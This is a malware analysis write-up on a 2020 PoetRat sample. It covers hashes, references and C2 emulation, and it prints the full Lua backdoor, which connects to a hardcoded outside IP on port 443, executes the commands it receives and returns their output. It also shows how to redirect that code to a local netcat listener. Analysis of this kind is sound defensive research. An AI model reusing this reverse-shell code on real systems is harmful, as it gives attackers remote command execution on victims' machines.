# PoetRat 2020-10-04

This sample is attributed to PoetRat via 
[Shadow Chaser Group](https://twitter.com/ShadowChasing1/status/1313112239822434304?s=20) and is a change from Python 
to Lua.  The same change is mentioned in the 
[Cisco Talos](https://blog.talosintelligence.com/2020/10/poetrat-update.html) update article.

# TL;DR
PoetRat goes with a basic Lua backdoor with no use of TLS..


# Table Of Contents 
1. [References](#references)
    1. [Hashes](#hashes)
    1. [Writeups](#writeups)
    1. [Sample Source](#sample-source)
1. [Maldoc Dropper](#maldoc-dropper-analysis)
1. [Payload Analysis](#payload-analysis)
    1. [Execution](#execution)
    1. [Payload](#payload)
1. [C2 Emulation](#c2-emulation)
    1. [C2 Emulation Setup](#c2-emulation-setup)
    1. [Malware Modification](#malware-modification)
    1. [Completed Emulation](#completed-emulation)
    

# References

## Hashes
|algo|hash|
|----|----|
|md5|bb6c57f1131358f4bb8a38c942b2f554|
|sha1|b46e072f91e854f2d4d938e90fc88060085c801b|
|sha256|dc565146cd4ecfb45873e44aa1ea1bac8cfa8fb086140154b429ba7274cda9a2|

## Writeups
[Cisco Talos Oct 2020](https://blog.talosintelligence.com/2020/10/poetrat-update.html) -- [Archive Link](https://web.archive.org/web/20201010004915/https://blog.talosintelligence.com/2020/10/poetrat-update.html)  
[Shadow Chaser Group](https://twitter.com/ShadowChasing1/status/1313112239822434304?s=20)  

## Sample Source
[Any.run](https://app.any.run/tasks/cd3f4071-3991-42fc-8195-d9bdd5d7bec4/)  
[VirusTotal](https://www.virustotal.com/gui/file/dc565146cd4ecfb45873e44aa1ea1bac8cfa8fb086140154b429ba7274cda9a2/details)  

# Maldoc Dropper Analysis
TODO

# Payload Analysis
Payload was found as a zip file being writen to disk.    
![](images/payload_zip.png)  

[milan.zip.zip](malware_lives_here/mew.zip.zip) - password `infected`

## Execution 
After the payload is unzipped, we can see the lua script being started via the lua binary.

![](images/execution.png)

## Payload
Looking at `row.lua`, it appears to be a _very_ simple Lua based backdoor. The entire code follows

```lua
function boo()
    local host, port = '111.90.149.218', 443
    local socket = require('socket')
    local tcp = socket.tcp()
    local io = require('io')

    tcp:connect(host, port);

    while true do
        local cmd, status, partial = tcp:receive()
        local f = io.popen(cmd, 'r')
        local s = f:read('*a') 
        f:close() 
        tcp:send(s)
        if status == 'closed' then
            break
        end
	end tcp:close()
end

while true do
	pcall(boo)
end
```

# C2 emulation
Just for run, we'll setup a modify this to connect to a netcat listener and see if we can get some commands to run.  

There is no use of TLS within this connection, so commands and responses are in the clear. 

This particular backdoor also suffers from being single threaded as the `io.popen()` call waits for the executed 
process to close before returning it's output.  

## C2 Emulation Setup

Setup the Listener
```bash
$ ncat -l 443
```    
## Malware Modification
change the IP in the `boo` function
```lua
function boo()
    --- local host, port = '111.90.149.218', 443
    local host, port = '127.0.0.1', 443
    local socket = require('socket')
    local tcp = socket.tcp()
```
Start the Malware
```bash
$ lua.cmd row.lua
```
### Completed Emulation
![](images/basic_command.png)
